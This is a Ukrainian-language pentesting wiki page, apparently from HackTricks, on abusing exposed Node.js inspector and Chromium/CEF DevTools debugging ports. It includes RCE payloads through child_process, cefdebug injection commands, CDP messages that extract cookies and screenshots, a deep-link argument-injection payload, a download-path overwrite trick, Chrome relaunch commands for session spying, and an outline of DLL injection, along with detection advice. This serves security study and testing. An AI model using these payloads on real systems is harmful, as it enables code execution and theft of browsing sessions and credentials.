# Node inspector/CEF debug abuse

{{#include ../../banners/hacktricks-training.md}}

Історичні практичні приклади включають walkthrough Multimaster та атаку на debugger Visual Studio Code через CVE-2019-1414; використовуйте їх як контекст, специфічний для певних версій, а не припускайте, що кожна актуальна ціль Electron або Chromium надає такі самі примітиви.<sup>[[1]](#references)[[3]](#references)</sup>

## Основна інформація

[З документації](https://nodejs.org/learn/getting-started/debugging): Якщо процес Node.js запущено з перемикачем `--inspect`, він прослуховує підключення debugging client. **За замовчуванням** він прослуховує host і port **`127.0.0.1:9229`**. Кожному процесу також призначається **унікальний** **UUID**.<sup>[[4]](#references)</sup>

Inspector clients повинні знати та вказати адресу host, port і UUID для підключення. Повний URL матиме приблизно такий вигляд: `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.<sup>[[4]](#references)</sup>

> [!WARNING]
> Оскільки **debugger має повний доступ до середовища виконання Node.js**, зловмисник, який може підключитися до цього port, може отримати можливість виконувати довільний code від імені процесу Node.js (**потенційне підвищення привілеїв**).<sup>[[4]](#references)</sup>

Існує кілька способів запустити inspector:<sup>[[4]](#references)</sup>
```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk also pauses at the start of the user script

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```
Коли ви запускаєте процес, який інспектується, з'явиться щось на кшталт цього:<sup>[[4]](#references)</sup>
```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```
Процеси на основі **CEF** (**Chromium Embedded Framework**) можуть відкривати налагоджувач із параметром `--remote-debugging-port=9222`. Це відкриває доступ до браузера через [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/), а не через інспектор Node.js, тому payload-и на основі `process` Node.js за замовчуванням не застосовуються безпосередньо.<sup>[[2]](#references)[[5]](#references)</sup>

Коли ви запускаєте браузер із налагодженням, з’явиться щось на кшталт такого:<sup>[[2]](#references)[[5]](#references)</sup>
```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```
### Перелік і керування CDP endpoint

HTTP discovery endpoints розрізняють **browser** WebSocket від окремих **target** (вкладка, worker, extension тощо) WebSockets. Виконайте запит до `/json/version` для endpoint browser і до `/json/list` для targets; повернуті значення `webSocketDebuggerUrl` можна безпосередньо використовувати через JSON-RPC-подібні повідомлення CDP.<sup>[[5]](#references)</sup>
```bash
# Browser metadata and browser-level WebSocket
curl -s http://127.0.0.1:9222/json/version | jq

# Pages/workers and their target-level WebSockets
curl -s http://127.0.0.1:9222/json/list |
jq '.[] | {id, type, title, url, webSocketDebuggerUrl}'

BROWSER_WS=$(curl -s http://127.0.0.1:9222/json/version | jq -r .webSocketDebuggerUrl)
PAGE_WS=$(curl -s http://127.0.0.1:9222/json/list | jq -r '[.[] | select(.type=="page")][0].webSocketDebuggerUrl')
```
Наприклад, підключіться за допомогою `websocat "$BROWSER_WS"` і надішліть `{"id":1,"method":"Target.getTargets"}` або `{"id":2,"method":"Storage.getCookies"}`. На page target (`websocat "$PAGE_WS"`) `Runtime.evaluate` виконується в цьому renderer, а `Page.captureScreenshot` повертає screenshot у форматі base64. `document.cookie` не може розкрити cookies із прапорцем `HttpOnly`, тоді як `Storage.getCookies` запитує cookie store браузера.<sup>[[5]](#references)</sup>
```json
{"id":3,"method":"Runtime.evaluate","params":{"expression":"({url:location.href,title:document.title,cookie:document.cookie})","returnByValue":true}}
{"id":4,"method":"Page.captureScreenshot","params":{"format":"png"}}
```
### Браузери, WebSockets і same-origin policy <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

Вебсайти, відкриті у веб-браузері, можуть виконувати WebSocket- і HTTP-запити відповідно до моделі безпеки браузера. **Початкове HTTP-з'єднання** необхідне, щоб **отримати унікальний ідентифікатор сесії debugger**. **Same-origin-policy** **перешкоджає** вебсайтам встановлювати **це HTTP-з'єднання**. Для додаткового захисту від [**DNS rebinding attacks**](https://en.wikipedia.org/wiki/DNS_rebinding)**,** Node.js перевіряє, що **заголовки 'Host'** для з'єднання точно вказують або **IP-адресу**, або **`localhost`**.<sup>[[4]](#references)</sup>

> [!TIP]
> Цей **захід безпеки перешкоджає експлуатації inspector** для виконання коду шляхом **простого надсилання HTTP-запиту** (що можна було б зробити, експлуатуючи уразливість SSRF).<sup>[[4]](#references)</sup>

### Запуск inspector у запущених процесах

Ви можете надіслати **сигнал SIGUSR1** запущеному процесу nodejs, щоб змусити його **запустити inspector** на порту за замовчуванням. Однак зверніть увагу, що вам потрібні достатні привілеї, тому це може надати вам **привілейований доступ до інформації всередині процесу**, але не безпосереднє підвищення привілеїв.<sup>[[4]](#references)</sup>
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
> [!TIP]
> Це корисно в контейнерах, оскільки **завершення процесу та запуск нового** з `--inspect` **неможливі**, адже **контейнер** буде **завершено** разом із процесом.<sup>[[6]](#references)</sup>

### Підключення до inspector/debugger

Щоб підключитися до **браузера на базі Chromium**, для Chrome або Edge відповідно можна відкрити URL `chrome://inspect` або `edge://inspect`. Натиснувши кнопку Configure, слід переконатися, що **цільові хост і порт** правильно вказані. На зображенні показано приклад Remote Code Execution (RCE):<sup>[[2]](#references)[[4]](#references)</sup>

![Після цього з'явиться URL для доступу до debugger, наприклад ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d - Підключення до inspector/debugger: Щоб підключитися до браузера на базі Chromium, ...](<../../images/image (674).png>)

За допомогою **командного рядка** можна підключитися до debugger/inspector:<sup>[[2]](#references)[[4]](#references)</sup>
```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```
Інструмент [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug) дає змогу **знаходити inspectors**, запущені локально, і **інжектити code** у них.<sup>[[2]](#references)</sup>
```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```
> [!TIP]
> Зверніть увагу, що **RCE-експлойти NodeJS не працюватимуть**, якщо підключитися до браузера через [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) (потрібно перевірити API, щоб знайти цікаві способи його використання).<sup>[[2]](#references)[[5]](#references)</sup>

## RCE in NodeJS Debugger/Inspector

> [!TIP]
> Якщо ви перейшли сюди, шукаючи спосіб отримати [**RCE із XSS в Electron, перегляньте цю сторінку.**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/index.html)

Деякі поширені способи отримання **RCE**, коли ви можете **підключитися** до Node **inspector**, передбачають використання чогось на кшталт (схоже, це **не працюватиме під час підключення до Chrome DevTools protocol**):<sup>[[2]](#references)</sup>
```javascript
process.mainModule.require("child_process").exec("calc")
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require("child_process").spawnSync("calc.exe")
Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
```
## Payloads Chrome DevTools Protocol

Ви можете переглянути API тут: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/).<sup>[[5]](#references)</sup>
У цьому розділі я просто перелічу цікаві речі, які, як я виявив, люди використовували для exploit цього протоколу.

### Обмеження профілю за замовчуванням у Chrome 136+

Починаючи з **Chrome 136**, Chrome ігнорує `--remote-debugging-port` і `--remote-debugging-pipe`, якщо вони вказують на **стандартний каталог даних Chrome**. Параметр потрібно використовувати разом із нестандартним `--user-data-dir`, окремий ключ шифрування та ізольований стан браузера якого запобігають тому, щоб проста техніка на основі прапорців розкрила звичайний автентифікований профіль користувача. Не слід вважати, що це обмеження, специфічне для Chrome, поширюється на старіші збірки Chrome, Chrome for Testing, застосунки Electron/CEF або інші похідні Chromium без перевірки.<sup>[[14]](#references)</sup>
```bash
# Valid current-Chrome debugging setup, but this is a new isolated profile
google-chrome --remote-debugging-port=9222 --user-data-dir=/tmp/chrome-cdp-lab
```
Тому наявність поточного процесу Chrome, запущеного лише з `--remote-debugging-port`, **не доводить**, що CDP став активним. Перевірте listener і `/json/version`, а також визначте, який саме profile його використовує.<sup>[[14]](#references)</sup>

### Ін’єкція параметрів через Deep Links

У [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) компанія Rhino security виявила, що застосунок на основі CEF **зареєстрував у системі custom URI** (workspaces://index.html), який отримував повний URI, а потім **запускав застосунок на основі CEF** із конфігурацією, частково сформованою з цього URI.<sup>[[8]](#references)</sup>

Було виявлено, що параметри URI декодувалися з URL і використовувалися для запуску базового застосунку CEF, що дозволяло користувачу **вставити** прапорець **`--gpu-launcher`** у **command line** і виконати довільні дії.<sup>[[8]](#references)</sup>

Отже, payload на кшталт:
```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```
Буде виконано calc.exe.<sup>[[8]](#references)</sup>

### Перезапис файлів

Змініть папку, у якій будуть зберігатися **завантажені файли**, і завантажте файл, щоб **перезаписати** часто використовуваний **source code** застосунку своїм **malicious code**.<sup>[[5]](#references)[[6]](#references)</sup>
```javascript
ws = new WebSocket(url) //URL of the chrome devtools service
ws.send(
JSON.stringify({
id: 42069,
method: "Browser.setDownloadBehavior",
params: {
behavior: "allow",
downloadPath: "/code/",
},
})
)
```
### Webdriver RCE та exfiltration

STAR Labs показала, що відкриті WebDriver/CDP-сервіси можуть уможливити довільне читання файлів і RCE; у деяких конфігураціях DNS rebinding може завершити ланцюжок exploit.<sup>[[9]](#references)</sup>

Додаткові історичні випадки browser-automation і security Chromium див. у write-up Counter WebDriver та issues Project Zero 773, 1742 і 1944.<sup>[[10]](#references)[[11]](#references)[[12]](#references)[[13]](#references)</sup>

### Увімкнення CDP у запущеному процесі Chromium

У Windows [**CDP-Enabler**](https://github.com/deathflamingo/CDP-Enabler) продемонстрував, що обмеження командного рядка — не єдиний спосіб активувати CDP: code, здатний виконувати injection в існуючий `msedge.exe`, може викликати неекспортовану функцію Chromium `content::DevToolsAgentHost::StartRemoteDebuggingServer` і відкрити authenticated live profile без перезапуску browser.<sup>[[15]](#references)</sup>

Продемонстрований ланцюжок виконує injection DLL за допомогою `VirtualAllocEx`/`WriteProcessMemory`/`CreateRemoteThread`, визначає internal Edge symbols (спочатку з PDB, а потім за допомогою version-specific byte signatures), створює subclass для browser window і надсилає message, щоб фінальний виклик запуску server виконався в **UI thread** browser. Socket прив’язується до loopback, після чого звичайні CDP primitives можуть отримувати cookies, захоплювати tabs, перевіряти network traffic або виконувати JavaScript в authenticated pages.<sup>[[15]](#references)</sup>

> [!WARNING]
> Це техніка **post-compromise/process-injection**, а не unauthenticated network bypass. Вона сильно залежить від build, оскільки відповідні C++ symbols не експортуються, а signatures можуть змінюватися після browser updates.<sup>[[15]](#references)</sup>

Для detection не покладайтеся лише на telemetry командного рядка `--remote-debugging-*`: також корелюйте незвичні handles і memory operations щодо browser processes (`PROCESS_VM_OPERATION`, `PROCESS_VM_WRITE`, створення threads), DLL injection та неочікувані loopback listening sockets, власниками яких є Chrome/Edge.<sup>[[15]](#references)</sup>

### Post-Exploitation

У реальному середовищі та **після компрометації** user PC, який використовує browser на базі Chromium, історичною технікою було перезапустити browser з увімкненим debugging і перенаправити loopback port. Це може відкрити browsing state жертви в продуктах/builds, які все ще приймають вибраний profile, але Chrome 136+ не застосує це до свого default data directory.<sup>[[7]](#references)[[14]](#references)</sup>

Оригінальна команда relaunch збережена нижче для older/version-specific targets. Друга команда є підтримуваною формою для current Chrome, але створює isolated profile замість повторного відкриття звичайного authenticated state жертви.<sup>[[7]](#references)[[14]](#references)</sup>
```powershell
# Historical: verify whether the target actually honors it
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"

# Current Chrome: CDP works, but against a new profile
Start-Process "Chrome" "--remote-debugging-port=9222 --user-data-dir=$env:TEMP\chrome-cdp"
```
Для специфічних для macOS технік relaunch, extension і CDP у Chromium див. [macOS Chromium Injection](../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-chromium-injection.md).



## References

- [1] [HackTheBox - Multimaster (IppSec)](https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s)
- [2] [taviso/cefdebug - інструмент для інспекції та exploitation debugger CEF/Chromium](https://github.com/taviso/cefdebug)
- [3] [CVE-2019-1414: віддалене виконання коду у Visual Studio Code через Chrome DevTools Debugger](https://iwantmore.pizza/posts/cve-2019-1414.html)
- [4] [Посібник з debugging Node.js - початок роботи](https://nodejs.org/learn/getting-started/debugging)
- [5] [Chrome DevTools Protocol](https://chromedevtools.github.io/devtools-protocol/)
- [6] [Звіт corCTF 2021 - saasme (Larry Yuan)](https://larry.science/post/corctf-2021/#saasme-2-solves)
- [7] [Post-Exploitation: зловживання debugging feature Chrome для віддаленого спостереження за сеансами browsing і керування ними](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)
- [8] [CVE-2021-38112: віддалене виконання коду в AWS WorkSpaces](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/)
- [9] [You Talking To Me? - WebDriver RCE через DNS Rebinding і CDP (STAR Labs)](https://starlabs.sg/blog/2021/04-you-talking-to-me/)
- [10] [Протидія WebDriver - від Bot до RCE](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148)
- [11] [Google Project Zero Issue 773 (трекер помилок Chromium)](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
- [12] [Google Project Zero Issue 1742 (трекер помилок Chromium)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
- [13] [Google Project Zero Issue 1944 (трекер помилок Chromium)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
- [14] [Зміни до remote debugging switches для підвищення безпеки - Chrome for Developers](https://developer.chrome.com/blog/remote-debugging-port)
- [15] [Injecting CDP into a Running Edge Browser: детальний огляд Runtime Browser Instrumentation](https://deathflamingo.com/blog/cdp_enabler/)
{{#include ../../banners/hacktricks-training.md}}
